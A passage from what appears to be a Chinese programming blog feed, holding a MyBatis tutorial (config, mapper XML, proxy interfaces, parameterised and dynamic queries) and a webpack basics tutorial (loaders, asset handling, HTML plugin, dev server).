class="hljs-string">&quot;root&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ztdgz947&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-comment">&lt;!--  映射文件位置--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;UserMapper.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p>而<code>UserMapper.xml</code>中就写入对应的sql语句，id是这个查询的唯一标识，resultType是对应的返回数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br>        <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">mapper</span></span><br><span class="hljs-meta">                <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">                <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br>                <br>        <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectAll&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.pojo.User&quot;</span>&gt;</span><br>                select * from tb_user;<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后我们在java文件中新建类com.pojo.User，设置返回的类型</p><p>使用<code>alt</code>+<code>fn</code>+<code>insert</code>配置getter，setter和toString</p><p>代码就不一一列举了</p><p>然后写主函数的主要代码</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//        1.加载mybatis配置文件，获取sqlSessionFactory</span><br><span class="hljs-comment">//        定义配置文件路径</span><br>        String resource = <span class="hljs-string">&quot;mybatis-config.xml&quot;</span>;<br>        InputStream inputStream = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Resources</span>.</span></span>get<span class="hljs-constructor">ResourceAsStream(<span class="hljs-params">resource</span>)</span>;<br>        SqlSessionFactory sqlSessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-constructor">SqlSessionFactoryBuilder()</span>.build(inputStream);<br><br><span class="hljs-comment">//        2.获取SQLSession对象，用于执行sql</span><br>        SqlSession sqlSession = sqlSessionFactory.<span class="hljs-keyword">open</span><span class="hljs-constructor">Session()</span>;<br><br><span class="hljs-comment">//        3，执行sql</span><br><span class="hljs-comment">//        selectList是使用List封装的result 如果只查询一个就使用selectOne就可以了</span><br>        List&lt;User&gt; users = sqlSession.select<span class="hljs-constructor">List(<span class="hljs-string">&quot;test.selectAll&quot;</span>)</span>;<br><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(users);<br><br><span class="hljs-comment">//        4.释放资源</span><br>        sqlSession.close<span class="hljs-literal">()</span>;<br></code></pre></td></tr></table></figure><h2 id="3-配置mapper代理"><a href="#3-配置mapper代理" class="headerlink" title="3.配置mapper代理"></a>3.配置mapper代理</h2><p><img src="https://s2.loli.net/2022/09/04/COujJv6ZKzA5WGs.png" alt="mapper代理开发.png"></p><p>第一步 _  设置同一目录的同一接口</p><p>com 包下新建一个mapper包，放入我们的接口文件<code>UserMapper</code></p><p>然后在resource中加入一个<code>directory</code>注意路径写成<code>com.mapper</code>也就是和接口文件一样的路径，将<code>UserMapper.xml</code>放入文件夹</p><p>这样子就做到了同一目录下的同名文件</p><p>在UserMapper接口文件中我们写入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mapper;<br><br><span class="hljs-keyword">import</span> com.pojo.User;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserMapper</span> </span>&#123;<br>    <span class="hljs-function">List&lt;User&gt; <span class="hljs-title">selectAll</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后将原来3部分的代码替换为通过接口获取的对象的方法</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//        3.1 使用接口代理对象获取,getMapper(类型.class)</span><br>        UserMapper userMapper = sqlSession.get<span class="hljs-constructor">Mapper(UserMapper.<span class="hljs-params">class</span>)</span>;<br><span class="hljs-comment">//        直接调用userMapper对象的selectAll的接口方法</span><br>        List&lt;User&gt; users = userMapper.select<span class="hljs-constructor">All()</span>;<br></code></pre></td></tr></table></figure><p>最后补充一个包扫描，在<code>mybatis.config.xml</code>中更改<code>mapper</code>配置为<code>package</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-comment">&lt;!--    &lt;mapper resource=&quot;UserMapper.xml&quot;/&gt;--&gt;</span><br><span class="hljs-comment">&lt;!--    使用包扫描的方式,因为对应的配置文件都在com.mapper下--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.mapper&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="4-mybatis核心配置"><a href="#4-mybatis核心配置" class="headerlink" title="4.mybatis核心配置"></a>4.mybatis核心配置</h2><p><img src="https://s2.loli.net/2022/09/04/n7CmQgBYqxwLech.png" alt="mybatis核心配置.png"></p><h2 id="5-配置文件完成增删改查"><a href="#5-配置文件完成增删改查" class="headerlink" title="5.配置文件完成增删改查"></a>5.配置文件完成增删改查</h2><p>首先我们需要安装一个叫做<code>MybatisX</code>的插件，他用于便捷我们的xml中statement对应id映射和java接口的切换</p><p>安装之后在映射和接口代码处会出现小鸟，点击小鸟就可以实现切换。写接口代码的时候也可以帮助我们实现补全xml配置代码。</p><h3 id="5-1查询"><a href="#5-1查询" class="headerlink" title="5.1查询"></a>5.1查询</h3><p>我们sql的代码一般80%以上都是查询代码</p><p>第一种我们查询全部数据</p><p>但是在查询的时候常常遇到，表里面的字段名和我们实体类的属性名不一致的情况</p><p>我们使用resultMap解决，实现字段名和属性名的一个统一</p><p><img src="https://s2.loli.net/2022/09/04/1taIz9GgY8LMhVm.png" alt="resultMap.png"></p><p>然后将select语句的<code>resultType</code>替换为<code>resultMap</code>，并保持和resultMap标签中的type一致</p><p>但是，当我们查询需要携带参数的时候。我们就需要</p><p>在接口代码中加入参数</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">User</span> <span class="hljs-title">selectById</span>(int id);<br></code></pre></td></tr></table></figure><p>然后在select语句中选择<code>#&#123;&#125;</code>或者<code>$&#123;&#125;</code>(一般因为有sql注入问题不使用)</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta">&lt;<span class="hljs-keyword">select</span> id=<span class="hljs-string">&quot;selectById&quot;</span> resultType=<span class="hljs-string">&quot;com.pojo.User&quot;</span>&gt;<br>    <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_user <span class="hljs-keyword">where</span> id = <span class="hljs-meta">#&#123;id&#125;//#&#123;&#125;会先将里面的文字转换为？，再填值</span><br>&lt;/<span class="hljs-keyword">select</span>&gt;<br></code></pre></td></tr></table></figure><p>我们还可以写<code>parameterType</code>字段写入输入类型</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta">&lt;<span class="hljs-keyword">select</span> id=<span class="hljs-string">&quot;selectById&quot;</span> parameterType=<span class="hljs-string">&quot;int&quot;</span> resultType=<span class="hljs-string">&quot;com.pojo.User&quot;</span>&gt;<br>    <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> tb_user <span class="hljs-keyword">where</span> id = <span class="hljs-meta">#&#123;id&#125;</span><br>&lt;/<span class="hljs-keyword">select</span>&gt;<br></code></pre></td></tr></table></figure><p>还有一些特殊字符的问题</p><p>比如<code>&lt;</code>号，xml无法识别</p><p>1.我们可以使用转义字符</p><p><code>select * from tb_user where id &amp;lt; #&#123;id&#125;</code></p><p>2.我们可以使用CDATA区，区域中的文本会被解析成纯文本</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">select * from tb_user where id </span><br><span class="xml"> &lt;![CDATA[</span><br><span class="xml">    &lt;</span><br><span class="xml"> ]]&gt;</span><br><span class="xml"> #</span><span class="hljs-template-variable">&#123;id&#125;</span><br></code></pre></td></tr></table></figure><p>对于条件查询，多参数查询</p><p>模糊查询可以使用like实现，但是java还是要对参数处理</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">String Username</span> = <span class="hljs-string">&quot;w&quot;</span>;<br><span class="hljs-attribute">Username</span> = <span class="hljs-string">&quot;%&quot;</span>+Username+<span class="hljs-string">&quot;%&quot;</span>;<br></code></pre></td></tr></table></figure><p>这样将参数模糊化</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">//        直接调用userMapper对象的selectAll的接口方法<br>        <span class="hljs-keyword">User</span> <span class="hljs-title">users</span> = userMapper.selectByName(Username);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/09/04/RDd7X5NgAHjbuJp.png" alt="条件查询.png"></p><p>有三种方法实现</p><p>第一种是挨个传入，但是需要Param注解对应的是那个参数</p><p>第二种是对象传入，适用于查询的条件全是一个对象里面参数的情况，而且名称要保持一致</p><p>第三种是依靠映射关系查询，map集合的名称也要和参数保持一致</p><p>动态查询</p><p>依靠mybatis中的if和where标签判断和连接</p><p><img src="https://s2.loli.net/2022/09/04/pO2PJutXCjk9Z1l.png" alt="动态查询.png"></p><p>动态单条件查询</p><p>依靠提供的choose标签，对更换的查询条件进行判断</p><p><img src="https://s2.loli.net/2022/09/04/nNr2G7smUqgzRFp.png" alt="动态单条件查询.png"></p><p><code>otherwise</code>标签可以在以上三种条件都不起作用时保底</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JDBC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webpack</title>
    <link href="/2022/06/21/webpack/"/>
    <url>/2022/06/21/webpack/</url>
    
    <content type="html"><![CDATA[<h1 id="webpack基础"><a href="#webpack基础" class="headerlink" title="webpack基础"></a>webpack基础</h1><h2 id="1-webpack的基本使用"><a href="#1-webpack的基本使用" class="headerlink" title="1.webpack的基本使用"></a>1.webpack的基本使用</h2><p>webpack是一个静态资源的打包工具，将一个或者多个文件作为入口文件，然后组合编译成一个或者多个文件输出出去</p><p>现在大多数的打包都是使用的webpack，当然在vue3之后，vue团队还推出了vite作为新型的打包工具</p><p>在打包过程中我们将main.js作为入口文件，在main.js中引入count.js和reduce.js文件</p><p><img src="https://s2.loli.net/2022/06/28/Khl3Z85LxmVsvuH.png" alt="webpack基本使用.png"></p><p>1.第一件事情是初始化webpack——<code>npm init -y</code> 得到一个package.json的文件，需要将里面的name字段改为<code>webpack_code</code></p><p>2.然后安装webpack和相关指令——<code>npm i webpack webpack-cli -D</code></p><p>3.使用<code>npx webpack ./src/main.js --mode=development</code>开始打包（main.js是我们的入口文件，–mode=development代表打包模式为开发模式也可以使用production代表生产模式）</p><p>打包完成后我们会得到一个dist文件夹，dist文件夹下是我们的入口函数main.js，通过在index.html中引入<code>./dist/main.js</code>使用main.js</p><h2 id="2-webpack的基本配置"><a href="#2-webpack的基本配置" class="headerlink" title="2.webpack的基本配置"></a>2.webpack的基本配置</h2><p>webpack有五大核心概念——entry(入口)，output(输出),loader(加载器-解析其他资源)，piugins(插件),mode(模式-生产模式和开发模式)</p><p>而webpack的配置文件都是建立在项目根目录下，叫做webpack.config.js的文件，里面就需要包含我们的五大核心概念</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">const path = require(<span class="hljs-string">&#x27;path&#x27;</span>)<span class="hljs-regexp">//</span>获取node.js的path模块<br><br>module.exports = &#123;<br>    <span class="hljs-regexp">//</span>入口<br>    entry: <span class="hljs-string">&quot;./src/main.js&quot;</span>,<span class="hljs-regexp">//</span>相对路径<br>    <span class="hljs-regexp">//</span>输出<br>    output: &#123;<br>        <span class="hljs-regexp">//</span>输出路径<br>        <span class="hljs-regexp">//</span>__dirname代表当前文件的文件夹目录的绝对路径<br>        path: path.resolve(__dirname, <span class="hljs-string">&quot;dist&quot;</span>),<span class="hljs-regexp">//</span>当前目录下的dist文件夹<br>        <span class="hljs-regexp">//</span>文件名<br>        filename: <span class="hljs-string">&quot;main.js&quot;</span><br>    &#125;,<br>    <span class="hljs-regexp">//</span>加载器<br>    module: &#123;<br>        rules: [<br>            <span class="hljs-regexp">//</span>loader的配置<br>        ],<br>    &#125;,<br>    <span class="hljs-regexp">//</span>插件<br>    plugins: [<br>        <span class="hljs-regexp">//</span>piugins的配置<br>    ],<br>    <span class="hljs-regexp">//</span>模式<br>    mode: <span class="hljs-string">&quot;development&quot;</span><br><br>&#125;<br></code></pre></td></tr></table></figure><p>现在，运行我们的webpack只需要<code>npx webpack</code>就可以运行我们的webpack了</p><h2 id="3-识别样式资源"><a href="#3-识别样式资源" class="headerlink" title="3.识别样式资源"></a>3.识别样式资源</h2><p>webpack本身只能识别js和json文件，那么如果想对样式资源进行打包，我们就需要下载各式各样的loader</p><h3 id="3-1识别css资源"><a href="#3-1识别css资源" class="headerlink" title="3.1识别css资源"></a>3.1识别css资源</h3><p>我们先看看官方文档中的做法</p><p><img src="https://s2.loli.net/2022/06/28/ONWuR5ftivQjDZH.png" alt="打包css.png"></p><p>我们首先建立一个.css文件，将css文件引入main.js中，按照官方文档的提示进行打包，需要注意的是：官方文档只安装了css-loader，但是实际上我们还需要安装style-loader</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>加载器<br>module: &#123;<br>    rules: [<br>        <span class="hljs-regexp">//</span>loader的配置<br>        &#123;<br>            test: <span class="hljs-regexp">/\.css$/i</span>,<span class="hljs-regexp">//</span>匹配.css文件<br>            <span class="hljs-regexp">//</span>执行顺序从右到左<br>            use: [<span class="hljs-string">&quot;style-loader&quot;</span>, <span class="hljs-string">&quot;css-loader&quot;</span>],<span class="hljs-regexp">//</span>css是将css转换为commonjs放入js，style是将js中的css转换为style标签中的内容<br>        &#125;,<br>    ],<br>&#125;,<br></code></pre></td></tr></table></figure><h3 id="3-2-识别less，sass，styl资源"><a href="#3-2-识别less，sass，styl资源" class="headerlink" title="3.2 识别less，sass，styl资源"></a>3.2 识别less，sass，styl资源</h3><p>这四个资源和css资源类似，也需要下载loader，具体参考官方文档，loader的作用是将对应文件转换为css文件</p><p>下载完成后在config.js中的rules中加入新的对象即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>loader的配置<br>&#123;<br>    test: <span class="hljs-regexp">/\.css$/i</span>,<span class="hljs-regexp">//</span>匹配.css文件<br>    <span class="hljs-regexp">//</span>执行顺序从右到左<br>    use: [<span class="hljs-string">&quot;style-loader&quot;</span>, <span class="hljs-string">&quot;css-loader&quot;</span>],<span class="hljs-regexp">//</span>css是将css转换为commonjs放入js，style是将js中的css转换为style标签中的内容<br>&#125;,<br>&#123;<br>    test: <span class="hljs-regexp">/\.less$/i</span>,<span class="hljs-regexp">//</span>匹配.less文件<br>    <span class="hljs-regexp">//</span>执行顺序从右到左<br>    use: [<span class="hljs-string">&quot;style-loader&quot;</span>, <span class="hljs-string">&quot;css-loader&quot;</span>,<span class="hljs-string">&quot;less-loader&quot;</span>], <br>&#125;,<br>&#123;<br>    test: <span class="hljs-regexp">/\.s[ac]ss$/i</span>,<span class="hljs-regexp">//</span>匹配.sass和.scss文件<br>    <span class="hljs-regexp">//</span>执行顺序从右到左<br>    use: [<span class="hljs-string">&quot;style-loader&quot;</span>, <span class="hljs-string">&quot;css-loader&quot;</span>,<span class="hljs-string">&quot;sass-loader&quot;</span>],<br>&#125;,<br>&#123;<br>    test: <span class="hljs-regexp">/\.styl$/i</span>,<span class="hljs-regexp">//</span>匹配.styl文件<br>    <span class="hljs-regexp">//</span>执行顺序从右到左<br>    use: [<span class="hljs-string">&quot;style-loader&quot;</span>, <span class="hljs-string">&quot;css-loader&quot;</span>,<span class="hljs-string">&quot;stylus-loader&quot;</span>],<br>&#125;,<br></code></pre></td></tr></table></figure><h2 id="4-处理图片"><a href="#4-处理图片" class="headerlink" title="4.处理图片"></a>4.处理图片</h2><p>webpack自带有处理图片的loader，所以我们不用下载</p><p>但是我们可以优化——（小于某个大小的图片可以转换为base64编码）</p><p>我们在rules中加入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;<br>    test: <span class="hljs-regexp">/\.(png|jpe?g|gif|webp|svg)$/</span>,<br>    type: <span class="hljs-string">&#x27;asset&#x27;</span>,<br>   parser: &#123;<br>     dataUrlCondition: &#123;<br>        <span class="hljs-regexp">//</span>小于<span class="hljs-number">10</span>kb的图片会转base64<br>       maxSize: <span class="hljs-number">10</span> * <span class="hljs-number">1024</span> <span class="hljs-regexp">//</span> <span class="hljs-number">10</span>kb<br>     &#125;<br>   &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>代表小于10kb的图片会被打包成base64的编码，这样虽然图片的体积会变大，但是不用向服务器发送请求，减小了服务器的负担</p><h3 id="4-1修改文件输出目录"><a href="#4-1修改文件输出目录" class="headerlink" title="4.1修改文件输出目录"></a>4.1修改文件输出目录</h3><p>我们可以通过filename选项修改我们的输出文件的文件地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>文件名<br>filename: <span class="hljs-string">&quot;static/js/main.js&quot;</span>,<br></code></pre></td></tr></table></figure><p>这就是将main.js输出到了<code>dist/ststic/js/main.js</code></p><p>然后我们也可以通过添加</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">generator: &#123;<br>    <span class="hljs-regexp">//</span>输出图片地址名称<br>    <span class="hljs-regexp">//</span>hash值可以只取前十位<br>    filename: <span class="hljs-string">&#x27;static/image/[hash:10][ext][query]&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>修改图片的输出路径</p><h2 id="5-处理字体图标文件"><a href="#5-处理字体图标文件" class="headerlink" title="5.处理字体图标文件"></a>5.处理字体图标文件</h2><p>webpack同样可以处理字体图标文件，并存放在指定目录下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">&#123;<br>    test: <span class="hljs-regexp">/\.(ttf|wff2?)$/</span>,<br>    <span class="hljs-regexp">//</span>指定图片打包格式<br>    type: <span class="hljs-string">&#x27;asset/resource&#x27;</span>,<br>    generator: &#123;<br>        <span class="hljs-regexp">//</span>输出图片地址名称<br>        <span class="hljs-regexp">//</span>hash值可以只取前十位<br>        filename: <span class="hljs-string">&#x27;static/media/[hash:10][ext][query]&#x27;</span><br>    &#125;<br>&#125;,<br></code></pre></td></tr></table></figure><p>书写格式与图片类似</p><h2 id="6-处理HTML资源"><a href="#6-处理HTML资源" class="headerlink" title="6.处理HTML资源"></a>6.处理HTML资源</h2><p>处理html文件需要配置插件</p><p>使用<code>npm install --save-dev html-webpack-plugin </code>下载处理html的插件</p><p>在plugins中加入配置项</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>引入html模块插件<br>const HtmlWebpackPlugin = require(<span class="hljs-string">&#x27;html-webpack-plugin&#x27;</span>);<br><br>    <span class="hljs-regexp">//</span>插件<br>    plugins: [<br>        <span class="hljs-regexp">//</span>piugins的配置<br>        new ESLintPlugin(&#123;<br>            context: path.resolve(__dirname, <span class="hljs-string">&#x27;src&#x27;</span>)<br>        &#125;),<br>        new HtmlWebpackPlugin(&#123;<br>            <span class="hljs-regexp">//</span>将/index.html加载到新的html文件中<br>            <span class="hljs-regexp">//</span>特点 <span class="hljs-number">1</span>.有和原来文件一样的html结构 <span class="hljs-number">2</span>.自动引入打包的文件<br>            template: path.resolve(__dirname, <span class="hljs-string">&#x27;public/index.html&#x27;</span>)<br>        &#125;)<br>    ],<br></code></pre></td></tr></table></figure><p>加入后进行编译，得到我们的dist目录下的html文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>webpack<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">defer</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;static/js/main.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>hello webpack<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box2&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们发现不用引入script标签也可以出现相应的效果</p><h2 id="7-自动化"><a href="#7-自动化" class="headerlink" title="7.自动化"></a>7.自动化</h2><p>开发服务器帮助我们更改代码后，自动执行<code>npx webpack</code></p><p>首先安装这个开发服务器：<code>npm i webpack-dev-server -D</code></p><p>使用开发服务器是：<code>npx webpack serve</code></p><p>然后在config.js中加入：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>开发服务器<br>devServer: &#123;<br>    host: <span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-regexp">//</span>域名<br>    port: <span class="hljs-string">&#x27;3000&#x27;</span>,<span class="hljs-regexp">//</span>端口号<br>    open: true<span class="hljs-regexp">//</span>是否打开服务器<br>&#125;,<br></code></pre></td></tr></table></figure><p>之后我们更改代码只需要Ctrl+s保存就可以了</p><p>需要注意的是：我们的开发服务器不会把打包文件保存在dist目录下，而是保存在内存中。</p><h2 id="8-生产模式"><a href="#8-生产模式" class="headerlink" 